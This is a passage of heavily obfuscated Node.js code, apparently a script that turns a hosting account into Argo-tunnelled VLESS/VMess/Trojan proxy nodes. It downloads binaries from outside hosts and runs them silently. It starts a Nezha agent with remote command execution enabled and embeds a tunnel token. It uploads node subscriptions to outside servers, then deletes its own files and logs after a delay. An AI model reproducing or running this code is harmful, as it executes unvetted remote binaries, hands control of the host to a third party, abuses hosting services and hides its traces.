for\x20using\x20this\x20script,\x20enjoy!','success','Unknown','2096','match','has','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','existsSync','send','php\x20running\x20error:\x20','Download\x20','731865sXHnQY','\x20-c\x20','catch','leaflowhk.oog.de5.net','Error\x20in\x20startserver:','http://ip-api.com/json/','fileName','https://amd64.ssss.nyc.mn/v1','country_code','unlink','https://oooo.serv00.net/add-url','tunnel.json','xtls-rprx-vision','2087','Hello\x20world!','toString','listen','all','&fp=firefox&type=ws&host=','get','list.txt','NEZHA_KEY','ArgoDomain:','/api/add-nodes','arm','countryCode','127.0.0.1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','http\x20server\x20is\x20running\x20on\x20port:','test','ARGO_PORT','5002602JPiWbp','/trojan-argo','boot.log','data','platform','\x0a\x0avmess://','SUB_PATH','&path=%2Fvless-argo%3Fed%3D2560#','837708vWohQV','pkill\x20-f\x20\x22[','chmod','sub.txt','?security=tls&sni=','TunnelSecret','ARGO_DOMAIN','http','https://arm64.ssss.nyc.mn/agent','/config.json\x20>/dev/null\x202>&1\x20&','stringify','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','quic','9712557xRmbQV','https://ipapi.co/json/','NEZHA_PORT','taskkill\x20/f\x20/im\x20','statSync','forEach','\x0avless://','CFIP','log','block','unshift','floor','join','automatic\x20access\x20task\x20added\x20successfully','bdb83f9e-f800-40a2-8d7e-875c0632d18e','/vmess-argo','\x20>/dev/null\x202>&1','application/json','axios','config.json','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','10EGZDMm','/api/delete-nodes','trojan','clear','217189uKVZkI','util','stream','win32','\x0aclient_secret:\x20','unlinkSync','filter','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','--tls','App\x20is\x20running','1442836UhRIKV','random','status','/vmess-argo?ed=2560','2268680iqNOGv','\x20>/dev/null\x202>&1\x20&','\x20already\x20exists','443','2083','firefox','Subscription\x20uploaded\x20successfully','https://amd64.ssss.nyc.mn/web','fileUrl','from','ARGO_AUTH','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','charAt','https://arm64.ssss.nyc.mn/web','readdirSync','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','npm\x20running\x20error:\x20','eyJhIjoiNmVjNzZlNjAyMjFlMjdjYmRhYTBjNzVkMjYwOTAyZDAiLCJ0IjoiODk4ZTJkOTItZTZmOS00ZjVjLWI4ODYtNWNhOGI4NzlmYjAxIiwicyI6IlpUWmpaVGs1TW1JdE5HTTBZUzAwT1RZNExXRXlOek10WmpjNU1XRTRORFZqTXpZNCJ9','base64','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','exec','tls','\x20-s\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x20>\x20nul\x202>&1','/api/add-subscriptions','message','\x20-p\x20','UUID','Empowerment\x20failed\x20for\x20','\x20failed:\x20','blackhole'];_0x42e6=function(){return _0x384e7f;};return _0x42e6();}function cleanFiles(){const _0x387d6b={_0xa29ce4:0x10b,_0x13ba3d:0xf2,_0x5d1894:0x96},_0xab109e={_0x542090:0x92},_0x176d69={_0x13345e:0xac};setTimeout(()=>{const _0x5c58dc=_0x3a55,_0x396e3f=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x396e3f[_0x5c58dc(0x10b)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x396e3f[_0x5c58dc(_0x387d6b._0xa29ce4)](phpPath);process[_0x5c58dc(0x13c)]===_0x5c58dc(0xa6)?exec('del\x20/f\x20/q\x20'+_0x396e3f[_0x5c58dc(0x96)]('\x20')+_0x5c58dc(0xc9),_0x297981=>{const _0x35e537=_0x5c58dc;console[_0x35e537(0xa2)](),console[_0x35e537(0x92)](_0x35e537(_0x176d69._0x13345e)),console[_0x35e537(0x92)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x5c58dc(_0x387d6b._0x13ba3d)+_0x396e3f[_0x5c58dc(_0x387d6b._0x5d1894)]('\x20')+_0x5c58dc(0x9a),_0x42b70d=>{const _0x440563=_0x5c58dc;console['clear'](),console[_0x440563(_0xab109e._0x542090)](_0x440563(0xac)),console[_0x440563(_0xab109e._0x542090)](_0x440563(0x10e));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4e785e={_0x2522f0:0x9b,_0x155ebb:0x97,_0x5d04ad:0x101,_0x3d3dcf:0xcb},_0x46c94a=_0x1f2ec0;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x5854c6=await axios['post'](_0x46c94a(0x123),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x46c94a(_0x4e785e._0x2522f0)}});return console[_0x46c94a(0x92)](_0x46c94a(_0x4e785e._0x155ebb)),_0x5854c6;}catch(_0xf98f1b){return console[_0x46c94a(_0x4e785e._0x5d04ad)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0xf98f1b[_0x46c94a(_0x4e785e._0x3d3dcf)]),null;}}function _0x3a55(_0x2811a7,_0x287c96){const _0x42e681=_0x42e6();return _0x3a55=function(_0x3a55a1,_0x495d7a){_0x3a55a1=_0x3a55a1-0x86;let _0x14fc6e=_0x42e681[_0x3a55a1];return _0x14fc6e;},_0x3a55(_0x2811a7,_0x287c96);}async function startserver(){const _0x22a4b1=_0x1f2ec0;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2ed563){console[_0x22a4b1(0x101)](_0x22a4b1(0x11d),_0x2ed563);}}startserver()[_0x1f2ec0(0x11b)](_0x1ff0eb=>{const _0x373ca8={_0x512f2a:0x101,_0x4f2b86:0xf8},_0x2c2e6a=_0x1f2ec0;console[_0x2c2e6a(_0x373ca8._0x512f2a)](_0x2c2e6a(_0x373ca8._0x4f2b86),_0x1ff0eb);}),app[_0x1f2ec0(0x129)](PORT,()=>console[_0x1f2ec0(0x92)](_0x1f2ec0(0x135)+PORT+'!'));
